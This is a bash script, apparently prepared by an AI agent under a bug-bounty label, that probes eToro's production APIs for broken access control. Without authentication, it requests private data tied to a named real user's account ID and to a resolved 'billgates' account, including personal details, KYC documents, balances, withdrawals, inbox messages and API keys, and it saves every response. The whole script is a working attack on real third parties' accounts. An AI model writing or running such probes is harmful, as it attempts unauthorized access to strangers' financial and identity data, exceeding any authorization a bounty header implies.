#!/usr/bin/env bash
# eToro composer-api BAC probe — max ~35 requests, X-Bug-Bounty header
set -euo pipefail
HDR=(-H "X-Bug-Bounty: cursor-cloud-agent" -H "User-Agent: Mozilla/5.0 (compatible; BugBounty/1.0)" -H "Accept: application/json")
OUTDIR="/workspace/research/etoro/composer-api/raw"
LOG="$OUTDIR/log.txt"
COUNT_FILE="$OUTDIR/req_count.txt"
mkdir -p "$OUTDIR"
: > "$LOG"
echo "0" > "$COUNT_FILE"

# Public PI from prior recon (JeppeKirkBonde)
PUB_CID=2988943
PUB_USER=JeppeKirkBonde

req() {
  local id="$1" url="$2"
  shift 2
  local extra=("$@")
  local n
  n=$(cat "$COUNT_FILE")
  n=$((n + 1))
  echo "$n" > "$COUNT_FILE"
  echo "=== REQ#$n $id ===" >> "$LOG"
  echo "URL: $url" >> "$LOG"
  local body hdr
  body=$(mktemp)
  hdr=$(mktemp)
  local code
  code=$(curl -sS -L -D "$hdr" -o "$body" -w "%{http_code}" --max-time 25 "${HDR[@]}" "${extra[@]}" "$url" 2>>"$LOG" || echo "000")
  local size
  size=$(wc -c < "$body" | tr -d ' ')
  {
    echo "http_code=$code size=$size"
    echo "--- headers (selected) ---"
    grep -iE '^(HTTP/|content-type:|location:|www-authenticate:|x-|set-cookie: __cf|server:)' "$hdr" 2>/dev/null | head -25 || true
    echo "BODY_SNIP:"
    head -c 1500 "$body" | tr '\0' ' '
    echo
  } >> "$LOG"
  cp "$body" "$OUTDIR/${n}_${id}.body" 2>/dev/null || true
  cp "$hdr" "$OUTDIR/${n}_${id}.headers" 2>/dev/null || true
  rm -f "$body" "$hdr"
  echo "REQ#$n $id code=$code size=$size"
}

# 1 — billgates logininfo (single well-known public profile)
req logininfo_billgates "https://www.etoro.com/api/logininfo/v1.1/users/billgates/logininfo"

# 2 — public PI logininfo baseline
req logininfo_pub "https://www.etoro.com/api/logininfo/v1.1/users/${PUB_USER}/logininfo"

# --- sapi / www public social vs private ---
req sapi_pub_portfolio "https://www.etoro.com/sapi/trade-data/live/public/portfolios?cid=${PUB_CID}"
req sapi_user_gain "https://www.etoro.com/sapi/userstats/UserGain?cid=${PUB_CID}"
req sapi_risk_score "https://www.etoro.com/sapi/riskscore/UserRisk?cid=${PUB_CID}"
req sapi_rankings "https://www.etoro.com/sapi/rankings/rankings/?PopularInvestor=true&page=1&pageSize=1"

# Private-sensitive www.etoro.com/api (unauth)
req personaldetails "https://www.etoro.com/api/users/v1/${PUB_CID}/personaldetails/"
req usermetadata "https://www.etoro.com/api/usermetadata/v1/users/${PUB_CID}/"
req account_balance "https://www.etoro.com/api/account/v1/users/${PUB_CID}/balance"
req account_cash "https://www.etoro.com/api/trading/v1/users/${PUB_CID}/accountinfo"
req kyc_status "https://www.etoro.com/api/kyc/v1/users/${PUB_CID}/status"
req kyc_docs "https://www.etoro.com/api/kyc/v1/users/${PUB_CID}/documents"
req withdrawals "https://www.etoro.com/api/withdrawal/v1/users/${PUB_CID}/requests"
req messages "https://www.etoro.com/api/messages/v1/users/${PUB_CID}/inbox"
req api_keys "https://www.etoro.com/api/publicapi/v1/users/${PUB_CID}/keys"
req billing_user "https://billing.etoro.com/api/v1/users/${PUB_CID}"
req wallet_user "https://wallet.etoro.com/api/v1/users/${PUB_CID}/balance"

# tapi-real / tapi-demo legacy
req tapi_real_portfolio "https://tapi-real.etoro.com/api/v1/user/${PUB_CID}/portfolio"
req tapi_real_balance "https://tapi-real.etoro.com/api/v1/user/${PUB_CID}/account/balance"
req tapi_demo_root "https://tapi-demo.etoro.com/api/v1/user/${PUB_CID}/portfolio"

# public-api / uapi-front / watchlistapi
req public_api_root "https://public-api.etoro.com/api/v1/market-data/instruments"
req public_api_user "https://public-api.etoro.com/api/v1/users/${PUB_CID}/portfolio"
req uapi_front "https://uapi-front.etoro.com/api/v1/users/${PUB_CID}/profile"
req watchlistapi "https://watchlistapi.etoro.com/api/v1/watchlists?cid=${PUB_CID}"

# SSO userinfo (no auth)
req sso_userinfo "https://www.etoro.com/api/sso/v1/userinfo"

# sapi private portfolio path (legacy IDOR class from prior art)
req sapi_private_portfolio "https://www.etoro.com/sapi/trade-data/history/users/${PUB_CID}/portfolio/live"
req sapi_stats "https://www.etoro.com/sapi/userstats/stats/user/${PUB_CID}"

# accounts subdomain
req accounts_api "https://accounts.etoro.com/api/v1/users/${PUB_CID}"

# If billgates CID resolved, test same sensitive endpoints on billgates
BG_CID=""
if [ -f "$OUTDIR/1_logininfo_billgates.body" ]; then
  BG_CID=$(python3 -c "import json; d=json.load(open('$OUTDIR/1_logininfo_billgates.body')); print(d.get('realCID',''))" 2>/dev/null || true)
fi
if [ -n "$BG_CID" ] && [ "$BG_CID" != "None" ]; then
  req billgates_personaldetails "https://www.etoro.com/api/users/v1/${BG_CID}/personaldetails/"
  req billgates_balance "https://www.etoro.com/api/account/v1/users/${BG_CID}/balance"
  req billgates_sapi_private "https://www.etoro.com/sapi/trade-data/history/users/${BG_CID}/portfolio/live"
fi

# api.etoro.com gateway
req api_etoro_root "https://api.etoro.com/v1/users/${PUB_CID}"

echo "TOTAL=$(cat "$COUNT_FILE")" >> "$LOG"
echo "DONE total=$(cat "$COUNT_FILE") billgates_cid=${BG_CID:-n/a}"
